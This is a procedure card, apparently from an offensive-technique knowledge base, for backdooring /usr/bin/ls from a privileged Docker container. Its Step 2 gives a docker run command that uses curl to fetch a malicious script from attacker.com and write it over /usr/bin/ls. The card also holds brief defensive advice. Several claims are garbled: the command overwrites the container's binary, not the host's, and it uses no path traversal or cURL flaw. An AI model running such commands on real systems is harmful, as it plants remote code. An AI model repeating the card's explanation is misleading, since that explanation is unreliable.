---
tags:
  - docker
  - container-escape
  - binary-overwrite
type: procedure
tools:
  - '[[tools/Docker]]'
  - '[[tools/cURL]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/docker-curl-binary-overwrite]]'
verified: false
platforms:
  - Linux
  - Docker
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Change Default File Association]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:26:12.467Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 550b2a44-4b4a-4f8e-8780-fd5066c9c5ab
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Change Default File Association]]'
  - '[[Exploitation for Client Execution]]'
---
# Overwrite-System-Binary-in-Privileged-Docker-Container

## Summary

This procedure uses cURL path traversal inside a privileged Docker container to overwrite a host system binary (e.g., /usr/bin/ls), achieving RCE by hijacking execution flow.

## Description

In containerized environments, --privileged grants host access. Run cURL with absolute path to overwrite binaries. Target: Docker on Linux with vulnerable cURL. Outcomes: Malicious script executes whenever the binary is called, leading to container escape and host compromise.

## Requirements

1. Docker installed with privileged mode allowed
2. Attacker server hosting x.sh (malicious script)
3. Host with vulnerable cURL in Alpine image

## Defense

Defensive measures and detection strategies:

- Avoid --privileged; use minimal capabilities
- Run containers as non-root with read-only filesystems
- Monitor Docker events for privileged runs and file changes in /usr/bin/
- Scan images for vulnerable cURL versions

## Objectives

1. Overwrite host binary from container
2. Hijack execution for RCE
3. Demonstrate container-to-host escalation

## Instructions

### Step 1: Prepare Malicious Script

**Context**: Host x.sh on attacker.com (e.g., #!/bin/sh
echo "Hacked" > /tmp/hacked.log).

### Step 2: Run Privileged Container and Exploit

**Context**: Launch Alpine and execute cURL overwrite.

**Command** ([[commands/docker-curl-binary-overwrite]]):

```bash
docker run --privileged alpine sh -c 'curl http://attacker.com/x.sh -o /usr/bin/ls'
```

> Downloads and overwrites /usr/bin/ls. Expected: Silent; test with ls to trigger backdoor.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Change Default File Association]] Event Triggered Execution: Change Default File Association
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/docker-curl-binary-overwrite]]

## Tools Used

- [[tools/Docker]]
- [[tools/cURL]]

## Tags

- docker
- container-escape
- binary-overwrite
